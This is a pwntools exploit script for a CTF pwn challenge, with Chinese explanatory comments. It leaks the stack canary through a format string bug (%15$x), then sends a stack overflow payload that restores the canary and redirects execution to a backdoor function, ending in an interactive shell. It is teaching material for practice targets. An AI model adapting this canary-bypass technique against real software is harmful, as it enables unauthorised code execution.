from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
#context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28122)
elf = ELF("./pwn")

# test = b'aaaa' + b'%p ' * 20：用于测试格式化字符串的偏移量
test = b'aaaa' + b'%p ' * 20

# offset = 5+10：计算格式化字符串的偏移量
offset = 5+10

# 接收初始数据
io.recv()

# backdoor = 0x80486CE：backdoor函数的地址
backdoor = 0x80486CE

# 构造格式化字符串，读取canary值
payload = "%15$x"
io.sendline(payload)

# 接收并解析canary值
canary = int(io.recv(), 16)
print(canary)

# 构造栈溢出payload
# b'a' * (0x34 - 0xc)：填充到canary位置
# p32(canary)：覆盖canary值
# b'a' * 0xc：填充到返回地址位置
# p32(backdoor)：覆盖返回地址为backdoor函数地址
payload = b'a' * (0x34 - 0xc) + p32(canary) + b'a' * 0xc + p32(backdoor)

io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr + stack overflow - 格式化字符串泄露canary + 栈溢出
2. 核心原理：
   - 首先利用格式化字符串漏洞泄露canary值
   - 然后利用栈溢出覆盖返回地址到backdoor函数
3. 关键步骤：
   - 构造 `%15$x` 读取canary值
   - 解析canary值为整数
   - 构造栈溢出payload，包含canary值和backdoor地址
4. 执行流程：
   - 泄露canary -> 构造payload -> 触发栈溢出 -> 执行backdoor
5. 技术要点：
   - canary保护机制：栈溢出时会覆盖canary，触发程序崩溃
   - 泄露canary后，在payload中包含正确的canary值，绕过保护
   - 精确计算偏移量和填充长度
"""
